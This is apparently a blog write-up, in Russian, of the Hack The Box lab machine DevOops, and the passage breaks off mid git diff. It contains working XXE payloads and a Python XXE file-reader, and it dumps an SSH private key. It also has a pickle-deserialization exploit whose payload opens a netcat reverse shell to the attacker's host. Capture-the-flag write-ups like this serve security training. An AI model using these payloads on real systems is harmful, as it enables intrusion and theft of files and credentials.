---
layout: post
title: "HTB{ DevOops }"
date: 2018-10-22 22:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [hackthebox, linux, xxe, xml-entity-injection, code-analysis, python, deserialization, pickle, reverse-shell, git]
comments: true
published: true
---

**DevOops** — ненапряжная виртуалка под Linux'ом, уязвимая для XML-инъекций (XXE). В данном случае эта атака открывает 2 основных вектора проникновения внутрь системы: тривиальный (просто забрать ssh-ключ из домашней директории; кстати, этот способ — невнимательность создателя машины) и более каноничный, который задумывался как основной (десериализация вредоносной python-нагрузки). Внутри машины все будет совсем просто: для PrivEsc'а достаточно заглянуть в историю git-коммитов репозитория с исходниками блога, который крутится на вебе. По традиции охватим оба способа и накодим немного скриптов для автоматизации pwn'а на питончике. Gonna be fun!

<!--cut-->

**4.3/10**
{: style="color: orange; text-align: right;"}

[![banner.png]({{ "/img/htb/boxes/devoops/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/140 "Hack The Box :: DevOops")
{: .center-image}

![info.png]({{ "/img/htb/boxes/devoops/info.png" | relative_url }})
{: .center-image}

* TOC
{:toc}

# Разведка
## Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.91
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sat Oct 20 17:05:01 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.91
Nmap scan report for 10.10.10.91
Host is up, received user-set (0.052s latency).
Scanned at 2018-10-20 17:05:01 EDT for 1s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Oct 20 17:05:02 2018 -- 1 IP address (1 host up) scanned in 1.07 seconds
```

Version ([красивый отчет]({{ "/reports/nmap/htb/devoops/version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p22,5000 10.10.10.91
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sat Oct 20 17:05:31 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/reports/nmap/nmap-bootstrap.xsl -p22,5000 10.10.10.91
Nmap scan report for 10.10.10.91
Host is up, received echo-reply ttl 63 (0.048s latency).
Scanned at 2018-10-20 17:05:32 EDT for 8s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhnygpNZx4gdup8MisoZInL7I8UYHXjDzYzj8wISuATvYEQRGckobDZXz5xrdYuLX/X7RQrASXGODJBtOuViqdBQKKdTOwz2x+Sr/gZl3tauZsibsP0wx2DPcHJcY5WekLDcjes+WVpis+4YXb1TL5qKg5R88cGHH63lgkisidTUDp55lRuu9ocE0ZdS0fNrN4RJCATerQ9pCmKo4ZnFD83gAkEg0DNdlLAdxzB7BPE/k//ZJiRr06TfibO3S9Vsh/d+PenuWDKJPsA7CrCW3hfVUsJxsH8WDNrFTLko27jleSP1gmpPm/m/KeYmY17VGWrpCjN2WuStW+RV78h1xD
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEYP1w+H8Uuvfh0fzjA15tqYhqxIhiT8ODPLI4qTBvrM8pZIGErdFlMYGV3rhJAYqGJD05LsvJxC8zozRFmZuw=
|   256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKHzgVfUX3pUOQ+WBd7PUmFYowgwBWRHpz6EEAsWVEy
5000/tcp open  http    syn-ack ttl 63 Gunicorn 19.7.1
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 20 17:05:40 2018 -- 1 IP address (1 host up) scanned in 9.08 seconds
```

Итак, SSH на 22-м, и Gunicorn python-http-сервер на 5000-м (скорее всего, сайт на Flask'е) портах. Начинаем с веба.

# Web — Порт 5000
## Браузер
На `http://10.10.10.91:5000` нас ждет заглушка для будущего блога:

[![port5000-browser-1.png]({{ "/img/htb/boxes/devoops/port5000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/devoops/port5000-browser-1.png" | relative_url }})
{: .center-image}

На главной видим скриншот, демонстрирующий, как должен выглядеть фид после завершения работы над сайтом, и видим упоминание `feed.py` (его мы встретим чуть позже), "который станет [MVP](https://ru.wikipedia.org/wiki/Минимально_жизнеспособный_продукт "Минимально жизнеспособный продукт — Википедия") (***M**inimum **V**iable **P**roduct*) для местного блога".

Больше интересностей нет, идем дальше.

## gobuster
Смотрим, какие ресурсы скрывает веб:
```text
root@kali:~# gobuster -u 'http://10.10.10.91:5000' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -o gobuster/devoops.gobuster

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.91:5000/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/10/20 17:07:23 Starting gobuster
=====================================================
http://10.10.10.91:5000/feed (Status: 200)
http://10.10.10.91:5000/upload (Status: 200)
^C
```

И у нас есть 2 URL'а.

`/feed` — такой же скриншот как выше, только теперь на всю страницу:

[![port5000-browser-2.png]({{ "/img/htb/boxes/devoops/port5000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/devoops/port5000-browser-2.png" | relative_url }})
{: .center-image}

`/upload` — загрузчик фид-ленты в виде XML-документов:

[![port5000-browser-3.png]({{ "/img/htb/boxes/devoops/port5000-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/devoops/port5000-browser-3.png" | relative_url }})
{: .center-image}

Последняя страница с интерфейсом загрузки представляет наибольший интерес, т. к. именно она дарует нам возможность проведения XXE-атаки, речь о которой пойдет ниже.

# Чтение файлов через XXE
[Атака XXE](https://ru.wikipedia.org/wiki/File_(схема_URI)#Атака_XXE "File (схема URI) — Википедия") (***X**ml e**X**ternal **E**ntity*) — разновидность XML-инъекции, основная идея которой заключается в подключении к документу дополнительных компонент (так называемые *внешние сущности* (англ. *external entity*)), которые в свою очередь позволяют злоумышленнику читать содержимое локальных файлов с помощью ключевых слов `SYSTREM` и `URI`.

## XXE тест
Попробуем скрафтить пробный XML, учтя при этом обязательные поля `Author`, `Subject` и `Content`, о которых нас заботливо предупредили. Также, посмотрев на любой валидный фид в формате XML, можно увидеть ту структуру документа, которую ждут от нас создатели ресурса:
```xml
<!-- xxe-test.xml -->

<entry>
	<Author>3V1LH4CK3R</Author>
	<Subject>3V1LH4CK3R's subject</Subject>
	<Content>3V1LH4CK3R's content</Content>
</entry>
```

`<entry> ... </entry>` можно заменить на любой другой тег — главное, чтобы 3 обязательные сущности `Author`, `Subject` и `Content` были завернуты во внешнюю структуру. [Спецификация RSS 2.0](https://validator.w3.org/feed/docs/rss2.html#hrelementsOfLtitemgt "RSS 2.0 specification"), например, настаивает, что он должен называться `<item> ... </item>`, но в нашем случае это не играет никакой роли.

Для удобства загружать подготовленный XML с нагрузкой можно Burp'ом, а можно curl'ом прямо из консоли. Мне приятнее второй вариант:
```text
root@kali:~# curl -X POST -F "file=@xxe-test.xml; filename=test.xml" http://10.10.10.91:5000/upload
 PROCESSED BLOGPOST:
  Author: 3V1LH4CK3R
 Subject: 3V1LH4CK3R's subject
 Content: 3V1LH4CK3R's content
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

Содержимое документа нам вернулось, поэтому с уверенностью могу предположить, что XXE пройдет успешно, т. к. нам нужно всего лишь подключить внешнюю сущность, вызвать ее и посмотреть на возвращенный результат.

В качестве бонуса мы получили имя пользователя `roosa` и место хранения загруженных файлов. Просмотреть то, что только что было загружено, очевидно, можно так:
```text
root@kali:~# curl http://10.10.10.91:5000/uploads/test.xml
<entry>
        <Author>3V1LH4CK3R</Author>
        <Subject>3V1LH4CK3R's subject</Subject>
        <Content>3V1LH4CK3R's content</Content>
</entry>
```

## XXE Proof-of-Concept
Подсмотрев классический пример вредоносной XXE-инъекции на [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection "PayloadsAllTheThings/XXE injection at master · swisskyrepo/PayloadsAllTheThings"), создадим такой файл:
```xml
<!-- xxe-poc.xml -->

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY>
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<entry>
	<Author>3V1LH4CK3R</Author>
	<Subject>3V1LH4CK3R's subject</Subject>
	<Content>&xxe;</Content>
</entry>
```

И скормим его форме:
```text
root@kali:~# curl -X POST -F "file=@xxe-poc.xml; filename=poc.xml" http://10.10.10.91:5000/upload
 PROCESSED BLOGPOST:
  Author: 3V1LH4CK3R
 Subject: 3V1LH4CK3R's subject
 Content: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false

 URL for later reference: /uploads/poc.xml
 File path: /home/roosa/deploy/src
```

Вуаля, у нас есть XXE.

## XXE автоматизация
Очень скоро мне надоело ручками изменять строку с тем файлом, который я хочу прочитать, поэтому был написан простой скрипт, в интерактивном (и не очень) режиме позволяющий узнать содержимое нужного файла:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 devoops_xxe.py [FILENAME]

import requests
import re
import sys

URL = 'http://10.10.10.91:5000/upload'
REGEX = re.compile(r' Subject: (.*?)\n Content:', re.DOTALL)


def getFileContents(filename):
	xxe = f'''<?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE foo [
            <!ELEMENT foo ANY>
            <!ENTITY xxe SYSTEM "file://{filename}">
        ]>

        <entry>
            <Author>3V1LH4CK3R</Author>
            <Subject>&xxe;</Subject>
            <Content>3V1LH4CK3R's content</Content>
        </entry>'''

	files = {'file': ('xxe.xml', xxe, 'text/xml')}  # filename, content_type and headers
	proxies = {'http': 'http://127.0.0.1:8080'}  # debug proxy (e. g. Burp)
	res = requests.post(URL, files=files, proxies=proxies, timeout=0.5)

	fileContents = None
	if res.status_code == 200:
		try:
			fileContents = REGEX.search(res.text).group(1).strip()
		except AttributeError:
			pass

	return fileContents


def interactive():
	while True:
		filename = input('devoops> ').strip()
		try:
			fileContents = getFileContents(filename)
		except Exception as e:
			print('EXCEPTION: ' + str(e), end='\n\n')
		else:
			if fileContents:
				print(fileContents, end='\n\n')


def nonInteractive(filename):
	fileContents = None
	try:
		fileContents = getFileContents(filename)
	except Exception as e:
		print('EXCEPTION: ' + str(e))
	
	return fileContents


if __name__ == '__main__':
	if len(sys.argv) == 1:
		interactive()
	elif len(sys.argv) == 2:
		filename = sys.argv[1]
		fileContents = nonInteractive(filename)
		if fileContents:
			print(fileContents, end='\n\n')
	else:
		print(f'Usage: python3 {sys.argv[0]} [FILENAME]')
```

Теперь можно делать примерно следующее:
```text
root@kali:~# python3 devoops_xxe.py
devoops> /proc/version
Linux version 4.13.0-37-generic (buildd@lcy01-amd64-019) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #42~16.04.1-Ubuntu SMP Wed Mar 7 16:02:25 UTC 2018

devoops> /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

devoops> /etc/os-release
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

:astonished:

# Захват пользователя. Способ 1
Взглянем еще раз на активных пользователей:
```text
root@kali:~# python3 devoops_xxe.py /etc/passwd | grep -v -e nologin -e sync -e false
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
```

Первое, что приходит на ум — это проверить SSH-ключ *roosa*. И попытка оказывается успешной вследствие невнимательности автора подопытной машины:
```text
root@kali:~# python3 devoops_xxe.py /home/roosa/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

И на этом заканчивается первый способ, мы в системе :sweat_smile:
```text
root@kali:~# python3 devoops_xxe.py /home/roosa/.ssh/id_rsa > roosa.key
root@kali:~# chmod 600 roosa.key
root@kali:~# ssh -oStrictHostKeyChecking=no -i roosa.key roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

roosa@gitter:~$ whoami
roosa

roosa@gitter:~$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

### user.txt
```text
roosa@gitter:~$ cat /home/roosa/user.txt
c5808e16????????????????????????
```

# Захват пользователя. Способ 2
Рассмотрим более "правильный" способ PrivEsc'а до юзера: для этого заберем исходник `feed.py`, о котором шла речь на главной сайта, из директории `/home/roosa/deploy/src`:
```text
root@kali:~# python3 devoops_xxe.py /home/roosa/deploy/src/feed.py
```

```python
')
```

```python
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']


## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

Заметим, что исходник неполный в силу издержек чтения файла посредством XML-сущностей — мы нарвались на спец. символы (скорее всего, это угловые скобки `< >`), недавшие забрать содержимое целиком, поэтому имеем только часть кода. К счастью, нам вполне этого хватит. Полную версию можно найти в [эпилоге]({{ page.url }}#feedpy) .

Остановимся на устройстве ресурса `/newpost`, который не обнаружил gobuster:
```python
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
```

Невооруженным взглядом видна *pickle-deserialization*-уязвимость, о которой мы уже говорили, когда разбирали машину [Canape]({{ "/2018/09/28/htb-canape-write-up.html#анализ-кода" | relative_url }} "HTB: Canape Write-Up / snovvcrash’s Security Blog").

Поэтому, не вдаваясь в долгие рассуждения (и пропустив Proof-of-Concept, ибо лень), соберем скрипт, который подарит нам реверс-шелл:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python devoops_shell.py

import cPickle, requests, base64

LHOST = '10.10.14.14'
LPORT = '31337'
RHOST = '10.10.10.91'
RPORT = '5000'


class Payload(object):
	def __init__(self, cmd):
		self.cmd = cmd
	def __reduce__(self):
		import os
		return (os.system, (self.cmd,))


reverse_sh = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (LHOST, LPORT)
evilpickle = cPickle.dumps(Payload(reverse_sh))

r = requests.post('http://%s:%s/newpost' % (RHOST, RPORT), data=base64.urlsafe_b64encode(evilpickle))
print('POST {} {}'.format(r.status_code, r.url))
```

И мы снова внутри:
```text
root@kali:~# python devoops_shell.py

```

```text
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.91.
Ncat: Connection from 10.10.10.91:55294.

/bin/sh: 0: can't access tty; job control turned off
$ whoami
roosa

$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

```text
$ cat /home/roosa/user.txt
c5808e16????????????????????????
```

# SSH — Порт 22 (внутри машины)
Представим, что мы получили пользователя первым способом. Тогда, подключившись по SSH, осмотримся на машине:
```text
roosa@gitter:~$ ls -la
total 168
drwxr-xr-x 22 roosa roosa 4096 May 29 10:32 .
drwxr-xr-x  7 root  root  4096 Mar 19  2018 ..
-r--------  1 roosa roosa 5704 Mar 21  2018 .bash_history
-rw-r--r--  1 roosa roosa  220 Mar 19  2018 .bash_logout
-rw-r--r--  1 roosa roosa 3771 Mar 19  2018 .bashrc
drwx------ 12 roosa roosa 4096 Oct 22 07:06 .cache
drwx------  3 roosa roosa 4096 Mar 21  2018 .compiz
drwx------ 14 roosa roosa 4096 Mar 21  2018 .config
drwx------  3 root  root  4096 Mar 21  2018 .dbus
drwxrwxr-x  4 roosa roosa 4096 Mar 26  2018 deploy
drwxr-xr-x  2 roosa roosa 4096 May 29 10:44 Desktop
-rw-r--r--  1 roosa roosa   25 Mar 21  2018 .dmrc
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Documents
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Downloads
drwx------  3 roosa roosa 4096 Mar 20  2018 .emacs.d
-rw-r--r--  1 roosa roosa 8980 Mar 19  2018 examples.desktop
drwx------  2 roosa roosa 4096 Mar 26  2018 .gconf
-rw-rw-r--  1 roosa roosa   56 Mar 19  2018 .gitconfig
drwx------  3 roosa roosa 4096 May 31 04:49 .gnupg
-rw-------  1 roosa roosa 5100 May 29 10:32 .ICEauthority
drwx------  3 roosa roosa 4096 Mar 21  2018 .local
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Music
drwxrwxr-x  2 roosa roosa 4096 Mar 19  2018 .nano
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Pictures
-rw-r--r--  1 roosa roosa  655 Mar 19  2018 .profile
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Public
-rwxrw-r--  1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
-rw-rw-r--  1 roosa roosa 1839 Mar 26  2018 service.sh
-rw-rw-r--  1 roosa roosa 2206 Mar 26  2018 service.sh~
drwx------  2 roosa roosa 4096 Mar 26  2018 .ssh
-rw-r--r--  1 roosa roosa    0 Mar 21  2018 .sudo_as_admin_successful
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Templates
-r--------  1 roosa roosa   33 Mar 26  2018 user.txt
drwxr-xr-x  2 roosa roosa 4096 Mar 21  2018 Videos
-rw-rw-r--  1 roosa roosa  182 Mar 26  2018 .wget-hsts
drwxrwxr-x  3 roosa roosa 4096 Mar 21  2018 work
-rw-------  1 roosa roosa  205 May 29 10:32 .Xauthority
-rw-------  1 roosa roosa 1389 May 31 04:49 .xsession-errors
-rw-------  1 roosa roosa   82 May 24 15:51 .xsession-errors.old
```

Нам оставили `.bash_history`. Не буду приводить содержимое (оно длинное), скажу только, что все в истории указывало на git-репозиторий `/home/roosa/work/blogfeed`. Значит, туда и отправимся:
```text
roosa@gitter:~$ cd ~/work/blogfeed/
roosa@gitter:~/work/blogfeed$ ls -la
total 28
drwxrwx--- 5 roosa roosa 4096 Mar 21  2018 .
drwxrwxr-x 3 roosa roosa 4096 Mar 21  2018 ..
drwxrwx--- 8 roosa roosa 4096 Mar 26  2018 .git
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4096 Mar 19  2018 resources
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
drwxrwx--- 2 roosa roosa 4096 Mar 26  2018 src
```

## PrivEsc: roosa → root
```text
roosa@gitter:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   run-gunicorn.sh

Untracked files:
  (use "git add <file>..." to include in what will be committed)

        src/.feed.py.swp
        src/access.log
        src/app.py
        src/app.py~
        src/config.py
        src/devsolita-snapshot.png
        src/feed.log
        src/feed.pyc
        src/save.p

no changes added to commit (use "git add" and/or "git commit -a")
```

Заглянем в историю, попросив git показать измененные файлы с каждого коммита:
```text
roosa@gitter:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
```

Мне показались интересными два коммита, при которых менялся один и тот же файл с кредами: `33e87c3` и `d387abf`. С коммита `33e87c3` содержимое `resources/integration/authcredentials.key` оставалось неизменным (идентичным тому, что в файле сейчас), посмотрим же тогда, что скрывает более ранний коммит `d387abf`:
```
roosa@gitter:~/work/blogfeed$ git diff 33e87c3 d387abf
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
index 44c981f..f4bde49 100644
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
